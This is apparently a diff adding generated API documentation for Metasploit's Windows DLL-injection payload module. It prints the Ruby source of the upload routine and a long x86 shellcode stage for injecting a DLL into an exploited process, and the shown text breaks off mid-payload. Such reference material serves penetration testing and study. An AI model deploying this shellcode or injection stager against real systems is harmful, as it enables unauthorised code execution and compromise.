@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Windows::DllInject
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Windows::DllInject";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (D)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">DllInject</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Windows::DllInject
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/windows/dll_inject.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>DllInject common module stub that is meant to be included in payloads that make use of DLL injection.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#handle_connection_stage-instance_method" title="#handle_connection_stage (instance method)">#<strong>handle_connection_stage</strong>(conn, opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Transmits the DLL injection payload and its associated DLL to the remote computer so that it can be loaded into memory.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#library_name-instance_method" title="#library_name (instance method)">#<strong>library_name</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the library name.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#library_path-instance_method" title="#library_path (instance method)">#<strong>library_path</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Returns the library path.</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Windows.html#apply_prepends-instance_method" title="Msf::Payload::Windows#apply_prepends (method)">#apply_prepends</a></span>, <span class='object_link'><a href="../Windows.html#exit_types-class_method" title="Msf::Payload::Windows.exit_types (method)">exit_types</a></span>, <span class='object_link'><a href="../Windows.html#handle_intermediate_stage-instance_method" title="Msf::Payload::Windows#handle_intermediate_stage (method)">#handle_intermediate_stage</a></span>, <span class='object_link'><a href="../Windows.html#include_send_uuid-instance_method" title="Msf::Payload::Windows#include_send_uuid (method)">#include_send_uuid</a></span>, <span class='object_link'><a href="../Windows.html#replace_var-instance_method" title="Msf::Payload::Windows#replace_var (method)">#replace_var</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="PrependMigrate.html" title="Msf::Payload::Windows::PrependMigrate (module)">PrependMigrate</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="PrependMigrate.html#apply_prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#apply_prepend_migrate (method)">#apply_prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate (method)">#prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate%3F-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate? (method)">#prepend_migrate?</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate_64-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate_64 (method)">#prepend_migrate_64</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="handle_connection_stage-instance_method">
+  
+    #<strong>handle_connection_stage</strong>(conn, opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Transmits the DLL injection payload and its associated DLL to the remote computer so that it can be loaded into memory.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/dll_inject.rb', line 204</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_handle_connection_stage'>handle_connection_stage</span><span class='lparen'>(</span><span class='id identifier rubyid_conn'>conn</span><span class='comma'>,</span> <span class='id identifier rubyid_opts'>opts</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_data'>data</span> <span class='op'>=</span> <span class='id identifier rubyid_library_name'>library_name</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00</span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='kw'>begin</span>
+    <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_open'>open</span><span class='lparen'>(</span><span class='id identifier rubyid_library_path'>library_path</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>rb</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_f'>f</span><span class='op'>|</span>
+      <span class='id identifier rubyid_data'>data</span> <span class='op'>+=</span> <span class='id identifier rubyid_f'>f</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span>
+    <span class='rbrace'>}</span>
+  <span class='kw'>rescue</span>
+    <span class='id identifier rubyid_print_error'><span class='object_link'><a href="../../../top-level-namespace.html#print_error-instance_method" title="#print_error (method)">print_error</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Failed to load DLL: </span><span class='embexpr_beg'>#{</span><span class='gvar'>$!</span><span class='embexpr_end'>}</span><span class='tstring_content'>.</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+    <span class='comment'># TODO: exception
+</span>    <span class='id identifier rubyid_conn'>conn</span><span class='period'>.</span><span class='id identifier rubyid_close'>close</span>
+    <span class='kw'>return</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Uploading DLL (</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_data'>data</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='embexpr_end'>}</span><span class='tstring_content'> bytes)...</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='comment'># Send the size of the thing we&#39;re transferring
+</span>  <span class='id identifier rubyid_conn'>conn</span><span class='period'>.</span><span class='id identifier rubyid_put'>put</span><span class='lparen'>(</span><span class='lbracket'>[</span> <span class='id identifier rubyid_data'>data</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>V</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='rparen'>)</span>
+  <span class='comment'># Send the image name + image
+</span>  <span class='id identifier rubyid_conn'>conn</span><span class='period'>.</span><span class='id identifier rubyid_put'>put</span><span class='lparen'>(</span><span class='id identifier rubyid_data'>data</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_print_status'>print_status</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Upload completed.</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+  <span class='comment'># Call the parent so the session gets created.
+</span>  <span class='kw'>super</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/dll_inject.rb', line 14</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='kw'>super</span><span class='lparen'>(</span><span class='id identifier rubyid_update_info'>update_info</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Name</span><span class='tstring_end'>&#39;</span></span>          <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Windows Inject DLL</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Description</span><span class='tstring_end'>&#39;</span></span>   <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Inject a custom DLL into the exploited process</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Author</span><span class='tstring_end'>&#39;</span></span>        <span class='op'>=&gt;</span>
+      <span class='lbracket'>[</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>jt &lt;jt@klake.org&gt;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>skape</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+      <span class='rbracket'>]</span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>License</span><span class='tstring_end'>&#39;</span></span>       <span class='op'>=&gt;</span> <span class='const'><span class='object_link'><a href="../../../top-level-namespace.html#MSF_LICENSE-constant" title="MSF_LICENSE (constant)">MSF_LICENSE</a></span></span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Platform</span><span class='tstring_end'>&#39;</span></span>      <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>win</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Arch</span><span class='tstring_end'>&#39;</span></span>          <span class='op'>=&gt;</span> <span class='const'>ARCH_X86</span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PayloadCompat</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span>
+      <span class='lbrace'>{</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Convention</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>sockedi -http -https</span><span class='tstring_end'>&#39;</span></span>
+      <span class='rbrace'>}</span><span class='comma'>,</span>
+    <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Stage</span><span class='tstring_end'>&#39;</span></span>         <span class='op'>=&gt;</span>
+      <span class='lbrace'>{</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Offsets</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span>
+          <span class='lbrace'>{</span>
+            <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>EXITFUNC</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span> <span class='lbracket'>[</span> <span class='int'>193</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>V</span><span class='tstring_end'>&#39;</span></span> <span class='rbracket'>]</span>
+          <span class='rbrace'>}</span><span class='comma'>,</span>
+        <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload</span><span class='tstring_end'>&#39;</span></span> <span class='op'>=&gt;</span>
+
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x55\x8b\xec\x81\xec\xa8\x01\x00\x00\x53\x56\x57\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5b\x83\xeb\x15\x89\x9d\x60\xff\xff\xff\x89\xbd\x58\xfe\xff\xff\xeb\x70\x56\x33</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xeb</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x09\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4\x3b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x04\x8b\x03\xc5\x89\x44\x24\x1c\x61\xc3\xe8\x8b\xff\xff\xff\x8b\xd8\x68\x8e\x4e</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0e\xec\x53\xe8\xa0\xff\xff\xff\x83\xc4\x08\x89\x45\xb4\x68\xaa\xfc\x0d\x7c\x53</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe8\x8f\xff\xff\xff\x83\xc4\x08\x89\x45\xb8\x68\x7e\xd8\xe2\x73\x53\xe8\x7e\xff</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\xff\x83\xc4\x08\x89\x45\xbc\x68\x54\xca\xaf\x91\x53\xe8\x6d\xff\xff\xff\x83</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc4\x08\x89\x45\xc0\x68\xac\x33\x06\x03\x53\xe8\x5c\xff\xff\xff\x83\xc4\x08\x89</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xc4\x68\xaa\xc8\xc8\xa3\x53\xe8\x4b\xff\xff\xff\x83\xc4\x08\x89\x45\xc8\x68</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x1b\xc6\x46\x79\x53\xe8\x3a\xff\xff\xff\x83\xc4\x08\x89\x45\xcc\x68\x80\x09\x12</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x53\x53\xe8\x29\xff\xff\xff\x83\xc4\x08\x89\x45\xd0\x68\xa1\x6a\x3d\xd8\x53\xe8</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x18\xff\xff\xff\x83\xc4\x08\x89\x45\xd4\x33\xc0\xb0\x6c\x50\x68\x6e\x74\x64\x6c</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x54\xff\x55\xb4\x8b\xd8\x68\x95\xdd\xb5\x92\x53\xe8\xf7\xfe\xff\xff\x83\xc4\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\x45\xa0\x68\x90\x78\x4a\x49\x53\xe8\xe6\xfe\xff\xff\x83\xc4\x08\x89\x45\xa4</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x68\xb8\x74\x29\x85\x53\xe8\xd5\xfe\xff\xff\x83\xc4\x08\x89\x45\xa8\x68\xcb\x9b</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xb2\x5b\x53\xe8\xc4\xfe\xff\xff\x83\xc4\x08\x89\x45\xac\x68\x94\x9b\x15\xd5\x53</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe8\xb3\xfe\xff\xff\x83\xc4\x08\x89\x45\xb0\xc6\x45\xf4\x77\xc6\x45\xf5\x73\xc6</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xf6\x32\xc6\x45\xf7\x5f\xc6\x45\xf8\x33\xc6\x45\xf9\x32\xc6\x45\xfa\x00\x8d</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xf4\x50\xff\x55\xb4\x8b\xd0\x68\xb6\x19\x18\xe7\x52\xe8\x7d\xfe\xff\xff\x83</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc4\x08\x89\x45\xec\x8d\x85\x58\xfe\xff\xff\x50\xe8\x7c\x06\x00\x00\x59\x5f\x5e</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5b\xc9\xc3\xff\xff\xff\xff\x55\x8b\xec\xe8\x00\x00\x00\x00\x59\x83\xe9\x08\xb8</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe8\x11\x40\x00\x2d\xe4\x11\x40\x00\x2b\xc8\x8b\x01\x5d\xc3\x55\x8b\xec\x51\x51</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x83\x65\xfc\x00\xeb\x07\x8b\x45\xfc\x40\x89\x45\xfc\x8b\x45\x0c\x0f\xb7\x00\x39</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xfc\x7d\x51\x83\x65\xf8\x00\xeb\x07\x8b\x45\xf8\x40\x89\x45\xf8\x8b\x45\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x4d\xf8\x3b\x88\x04\x01\x00\x00\x7d\x22\x8b\x45\xfc\x03\x45\xf8\x8b\x4d\x0c</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x49\x04\x0f\xb7\x04\x41\x8b\x4d\x08\x03\x4d\xf8\x0f\xbe\x49\x04\x3b\xc1\x74</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x02\xeb\x02\xeb\xc9\x8b\x45\x08\x8b\x4d\xf8\x3b\x88\x04\x01\x00\x00\x75\x04\x33</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xc0\xeb\x05\xeb\x9d\x33\xc0\x40\xc9\xc3\x55\x8b\xec\x51\xe8\x68\xff\xff\xff\x89</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x45\xfc\x8b\x45\x10\xff\x70\x08\xff\x75\xfc\xe8\x73\xff\xff\xff\x59\x59\x85\xc0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x75\x12\x8b\x45\x08\x8b\x4d\xfc\x8b\x89\x10\x01\x00\x00\x89\x08\x33\xc0\xeb\x12</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x80\x01\x00\x00\xc9\xc2</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x0c\x00\x55\x8b\xec\x51\xe8\x20\xff\xff\xff\x89\x45\xfc\x8b\x45\x08\xff\x70\x08</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x75\xfc\xe8\x2b\xff\xff\xff\x59\x59\x85\xc0\x75\x5d\x8b\x45\x0c\xc7\x00\xe0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x04\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x08\xe0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5c\x27\x8e\x8b\x45\x0c\xc7\x40\x0c\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x10\xe0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x14\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x18\xe0</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x1c\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x20\x80</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\x00\x33\xc0\xeb\x0f\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x84\x01</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\x00\xc9\xc2\x08\x00\x55\x8b\xec\x51\xe8\x90\xfe\xff\xff\x89\x45\xfc\x8b\x45</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x10\xff\x70\x08\xff\x75\xfc\xe8\x9b\xfe\xff\xff\x59\x59\x85\xc0\x75\x10\x8b\x45</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x08\x8b\x4d\xfc\x8b\x89\x10\x01\x00\x00\x89\x08\xeb\x1b\xff\x75\x1c\xff\x75\x18</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xff\x75\x14\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x8b\x45\xfc\xff\x90\x88\x01\x00</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x00\xc9\xc2\x18\x00\x55\x8b\xec\x51\xe8\x41\xfe\xff\xff\x89\x45\xfc\x8b\x45\xfc</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x8b\x4d\x20\x3b\x88\x10\x01\x00\x00\x75\x12\x8b\x45\x08\x8b\x4d\xfc\x8b\x89\x10</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
+<span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x01\x00\x00\x89\x08\x33\xc0\xeb\x1e\xff\x75\x20\xff\x75\x1c\xff\x75\x18\xff\x75</span><span class='tstring_end'>&quot;</span></span> <span class='op'>+</span>
